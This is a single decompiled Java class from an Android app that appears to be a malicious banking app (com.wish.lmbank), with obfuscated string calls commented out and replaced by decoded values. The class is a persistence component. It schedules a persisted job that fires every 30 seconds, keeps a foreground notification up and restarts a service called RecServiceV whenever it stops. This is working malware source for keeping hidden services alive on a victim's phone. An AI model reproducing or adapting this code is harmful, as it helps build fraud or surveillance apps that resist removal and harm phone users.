package com.wish.lmbank.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.keeplive.KeepLive;
import com.wish.lmbank.keeplive.config.NotificationUtils;
import com.wish.lmbank.keeplive.receiver.NotificationClickReceiver;
import com.wish.lmbank.keeplive.utils.ServiceUtils;
import com.wish.lmbank.utils.PermissionUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/service/YLJobHandlerService.class */
public final class YLJobHandlerService extends JobService {
    private int jobId = 100;
    private JobScheduler mJobScheduler;
    private static final String TAG = "YLJobHandlerService-log";

    @SuppressLint("MissingPermission")
    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        Log.i(TAG, "onStartCommand: .........");
        startService(this);
        if (Build.VERSION.SDK_INT >= 21) {
//             JobScheduler jobScheduler = (JobScheduler) getSystemService(bb7d7pu7.m5998("AwYLGgoBDA0cBQwb"));
            JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
            this.mJobScheduler = jobScheduler;
            jobScheduler.cancel(this.jobId);
            JobInfo.Builder builder = new JobInfo.Builder(this.jobId, new ComponentName(getPackageName(), YLJobHandlerService.class.getName()));
            if (Build.VERSION.SDK_INT >= 24) {
                builder.setMinimumLatency(30000L);
                builder.setOverrideDeadline(30000L);
                builder.setMinimumLatency(30000L);
                builder.setBackoffCriteria(30000L, JobInfo.BACKOFF_POLICY_LINEAR);
            } else {
                builder.setPeriodic(30000L);
            }
            builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            builder.setPersisted(true);
            this.mJobScheduler.schedule(builder.build());
            return Service.START_STICKY;
        }
        return Service.START_STICKY;
    }

    private void startService(Context context) {
        if (KeepLive.foregroundNotification != null) {
            Intent intent = new Intent(getApplicationContext(), NotificationClickReceiver.class);
//             intent.setAction(bb7d7pu7.m5998("KiUgKiI2JyY9IC8gKig9ICYn"));
            intent.setAction("CLICK_NOTIFICATION");
            startForeground(13691, NotificationUtils.createNotification(this, KeepLive.foregroundNotification.getTitle(), KeepLive.foregroundNotification.getDescription(), KeepLive.foregroundNotification.getIconRes(), KeepLive.foregroundNotification.getLayoutId(), intent));
        }
        if (!AppStartV.isLoadUrl || PermissionUtils.hasAllPermission(AppStartV.getContext()).size() > 0) {
            return;
        }
        Log.i(TAG, "startService......... ");
        startService(new Intent(context, RecServiceV.class));
    }

    @Override // android.app.job.JobService
    public boolean onStartJob(JobParameters jobParameters) {
        if (new ServiceUtils().isServiceRunning(getApplicationContext(), RecServiceV.class.getName())) {
            return false;
        }
        startService(this);
        return false;
    }

    @Override // android.app.job.JobService
    public boolean onStopJob(JobParameters jobParameters) {
        if (new ServiceUtils().isServiceRunning(getApplicationContext(), RecServiceV.class.getName())) {
            return false;
        }
        startService(this);
        return false;
    }
}
